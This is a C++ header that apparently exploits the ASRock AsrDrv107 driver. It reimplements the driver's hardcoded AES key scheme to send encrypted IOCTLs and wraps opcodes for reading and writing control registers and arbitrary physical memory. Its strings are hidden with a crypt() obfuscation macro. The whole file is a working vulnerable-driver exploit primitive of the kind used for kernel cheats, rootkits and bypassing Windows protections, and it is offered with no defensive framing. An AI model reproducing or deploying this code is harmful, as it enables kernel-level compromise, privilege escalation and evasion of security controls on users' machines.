#pragma once
#include <windows.h>
#include "crypt.h"

#define WRITE_CR_OPCODE 0x22E870
#define READ_CR_OPCODE 0x22E86C
#define READ_PHYS_MEM_OPCODE 0x22E808
#define WRITE_PHYS_MEM_OPCODE 0x22E80C

class asrcontroller {
private:
	HANDLE device_handle;

    #pragma pack(push, 1)
    struct ioctl_bas
    {
        WORD pad;
        DWORD iv_size;
        unsigned __int8 iv[21];
        unsigned __int8 key[16];
        unsigned __int8 pad2[3];
    };

    struct ioctl_son
    {
        DWORD cmd_size;
        WORD pad;
    };
    #pragma pack(pop)

    #pragma pack(push, 1)
    union physical_args
    {
        unsigned __int8 char_args[24];
        unsigned __int16 word_args[12];
        DWORD dword_args[6];
        uint64_t qword_args[3];
    };

    struct asrock_commands
    {
        unsigned int opcode;
        int pad;
        physical_args args;
    };
    #pragma pack(pop)

public:
	bool create_handle() {
		this->device_handle = CreateFileA(crypt("\\\\.\\GlobalRoot\\Device\\AsrDrv107"), GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (!this->device_handle || this->device_handle == INVALID_HANDLE_VALUE)
			return false;
		
		return true;
	}

    HANDLE get_handle() {
        return this->device_handle;
    }

    void prepare_aes_enc(void* cmd_in, size_t cmd_size, PVOID* pIoctl_data_out, size_t* buf_size_out) {
        ioctl_bas hdr;
        RtlZeroMemory(&hdr, sizeof(hdr));

        memset(hdr.iv, 0x69, sizeof(hdr.iv));
        memset(hdr.key, 0x69, sizeof(hdr.key));
        hdr.iv_size = sizeof(hdr.iv);

        DWORD cb_enc;
        BYTE* my_cipher;

        BCRYPT_ALG_HANDLE halgorithm;
        DWORD result = BCryptOpenAlgorithmProvider(&halgorithm, crypt(L"AES"), 0i64, 0);

        BYTE enc_key[32];
        memset(enc_key, 0, sizeof(enc_key));
        memmove(enc_key, crypt("C110DD4FE9434147B92A5A1E3FDBF29A"), 32ui64);
        *(__m128i*)& enc_key[13] = _mm_loadu_si128((const __m128i*)hdr.key);

        HANDLE hd_key;
        result = BCryptGenerateSymmetricKey(halgorithm, &hd_key, 0i64, 0, enc_key, 0x20u, 0);

        BYTE* ivCopy = (BYTE*)malloc(hdr.iv_size);
        memcpy(ivCopy, hdr.iv, hdr.iv_size);

        size_t cipher_buf_size = cmd_size + 64;
        my_cipher = (BYTE*)calloc(1, cipher_buf_size);

        result = BCryptEncrypt(hd_key, (BYTE*)cmd_in, cmd_size, 0, ivCopy, hdr.iv_size, my_cipher, cipher_buf_size, &cb_enc, BCRYPT_BLOCK_PADDING);

        size_t buf_size = sizeof(ioctl_bas) + cb_enc + sizeof(ioctl_son);
        BYTE* buf = (BYTE*)calloc(1, buf_size);
        memcpy(buf, &hdr, sizeof(hdr));
        memcpy(buf + sizeof(hdr), my_cipher, cb_enc);
        ioctl_son* footer = (ioctl_son*)(buf + buf_size - sizeof(ioctl_son));
        footer->cmd_size = cb_enc;

        *pIoctl_data_out = buf;
        *buf_size_out = buf_size;
    }

    bool send_cmd(asrock_commands command, void** out, size_t* output_len) {
        void* input_ptr;

        size_t input_buffer_len;

        const size_t output_buf_sz = 0x1000;
        uint8_t output_buffer[output_buf_sz];
        ULONG output_buffer_len;
        prepare_aes_enc(&command, sizeof(command), &input_ptr, &input_buffer_len);

        BOOL ret = DeviceIoControl(this->device_handle, 0x22EC00, input_ptr, input_buffer_len, output_buffer, output_buf_sz, &output_buffer_len, NULL);

        if (ret != 1) {
            return ret;
        }

        //we dont want access errors
        if (out != NULL) {
            *out = malloc(output_buffer_len);
            memcpy(*out, output_buffer, output_buffer_len);
            if (output_len != NULL) {
                *output_len = output_buffer_len;
            }
        }

        if ((LONG)output_buffer_len < 0) {
            return ret;
        }

        return ret;
    }

    void write_control_register(DWORD crNum, uint64_t val) {
        asrock_commands my_cmd;
        memset((void*)&my_cmd, 0, sizeof(asrock_commands));
        my_cmd.opcode = WRITE_CR_OPCODE;
        my_cmd.args.dword_args[0] = crNum;
        my_cmd.args.qword_args[1] = val;
        send_cmd(my_cmd, NULL, NULL);
    }

    uint64_t read_control_register(DWORD crNum) {
        asrock_commands my_cmd;
        memset((void*)&my_cmd, 0, sizeof(asrock_commands));
        my_cmd.opcode = READ_CR_OPCODE;
        my_cmd.args.dword_args[0] = 3;

        void* output;
        size_t output_len;
        send_cmd(my_cmd, &output, &output_len);
        uint64_t crx = *(uint64_t*)((BYTE*)output + 8);

        return crx;
    }

    bool read_physical_memory(uint64_t physical_address, DWORD len, void* buf) {
        asrock_commands my_cmd;
        memset((void*)&my_cmd, 0, sizeof(asrock_commands));
        my_cmd.opcode = READ_PHYS_MEM_OPCODE;
        my_cmd.args.qword_args[0] = physical_address;
        my_cmd.args.qword_args[2] = (uint64_t)buf;
        my_cmd.args.dword_args[2] = len;
        my_cmd.args.dword_args[3] = 0;

        return send_cmd(my_cmd, NULL, NULL);
    }

    bool write_physical_memory(uint64_t physical_address, DWORD len, void* buf) {
        asrock_commands my_cmd;
        memset((void*)&my_cmd, 0, sizeof(asrock_commands));
        my_cmd.opcode = WRITE_PHYS_MEM_OPCODE;
        my_cmd.args.qword_args[0] = physical_address;
        my_cmd.args.qword_args[2] = (uint64_t)buf;
        my_cmd.args.dword_args[2] = len;
        my_cmd.args.dword_args[3] = 0;

        return send_cmd(my_cmd, NULL, NULL);
    }
};

inline asrcontroller memory;